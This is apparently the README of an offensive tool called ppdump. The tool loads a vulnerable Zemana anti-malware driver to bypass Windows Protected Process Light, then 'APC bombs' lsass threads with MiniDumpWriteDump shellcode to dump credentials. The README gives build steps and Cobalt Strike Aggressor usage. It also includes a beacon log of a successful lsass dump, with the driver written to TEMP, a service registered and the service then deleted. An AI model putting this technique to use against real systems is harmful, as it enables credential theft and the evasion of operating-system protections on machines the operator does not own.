## About

The bug that I abuse  goes to [@Dark_Puzzle](https://twitter.com/Dark_Puzzle) whom disclosed [here](http://rce4fun.blogspot.com/2018/02/malwarefox-antimalware-zam64sys.html) the privileged registration with Zemana AntiMalware. I only expanded upon this to use an additional IOCTL to open a thread with FULL_ACCESS (but still with some limitations!).

Protected Process (Light) on the latest iterations of Microsoft Windows has become the bane of most attackers - it prevents tools such as Mimikatz from obtaining a privileged handle to critical processes such as lsass, winlogon, and crss, all of which control the Microsoft kernel in various ways. As such, I studied various means of attacking the kernel and discovered one particular way which succeeded - using a stolen kernel driver to open a privileged handle the process and its underlying threads.

Using these privileged handles, I was able to successfully "APC Bomb" each individual threads until it reached an altertable state by using QueueUserAPC, and Stomping / Resuming the threads a multitude of times. 

### Build

The ppdump module can be built using `Make` and `Mingw-W64`. Simply download the make build system using your favorite package manager, as well the Mingw compiler package, and then run `make`. 

```sh 
$ make
make -f Makefile.x64
make[1]: Entering directory '/home/austin/projects/ppdump-public'
cp -rf src/drvs/zam.x64.h src/zam.x64.h
cp -rf src/shellcode/payload.x64.h src/payload.x64.h
x86_64-w64-mingw32-gcc -shared -s -ldbghelp -lntdll src/*.c src/ldr/*.c -o ppdump.x64.dll
make[1]: Leaving directory '/home/austin/projects/ppdump-public'
make -f Makefile.x86
make[1]: Entering directory '/home/austin/projects/ppdump-public'
cp -rf src/drvs/zam.x86.h src/zam.x86.h
cp -rf src/shellcode/payload.x86.h src/payload.x86.h
i686-w64-mingw32-gcc -shared -s -ldbghelp -lntdll src/*.c src/ldr/*.c -o ppdump.x86.dll
make[1]: Leaving directory '/home/austin/projects/ppdump-public
$ file ppdump.x64.dll ppdump.x64.dll
```

### Usage

Firstly, load the provided Cobalt Strike Aggresor Script into your script resource / console. Afterwards, using `ppdump` command with the provided PID (Process ID) of the target process - pass `ppdump <pid>`, which will kick off the Reflective Module loading process, and then start initializing the driver. A successful run with the process ID of Lsa should result in the following.

```
beacon> ppdump 820
[ ] driver will be stored in C:\WINDOWS\TEMP\tiGr4.sys
[ ] minidump will be stored in C:\WINDOWS\TEMP\usaxb.dmp
[+] Wrote 232792 to C:\WINDOWS\TEMP\tiGr4.sys successfully
[ ] attemping to load C:\WINDOWS\TEMP\tiGr4.sys with service control manager
[ ] registered service tiGr4.sys successfully
[ ] started service tiGr4.sys successfully
[+] LoadDriver() successfully loaded the driver
[ ] Calling ZemanaRegisterProcess() to add 3616
[ ] Opening target process -> 820

 ======= ENTER THE DANGER ZONE =======
[ ] MiniDumpWriteDump Shellcode is 1025 bytes
[ ] Attemping to APC Bomb All Threads
[+] apc successfully queued for 836
[+] apc successfully queued for 848
[+] apc successfully queued for 852
[+] apc successfully queued for 864
[+] apc successfully queued for 3456
[+] apc successfully queued for 4044
[+] apc successfully queued for 344
 ======= LEAVE THE DANGER ZONE =======

[ ] deleted service tiGr4.sys successfully
```

![](https://gitlab.guidepointsecurity.com/austin-hudson/ppdump/blob/master/ppldump_x64_proof_apc_bomb.png)

## Bugs
**NOTE**: Please do not run multiple instances of the ppdump command - wait until one has completed before running another. This is because only one driver can be loaded at a time - so if two are loaded at the same time, the process tends to break quiet quickly. Furthermore some of the threads will lock up during the injection process.
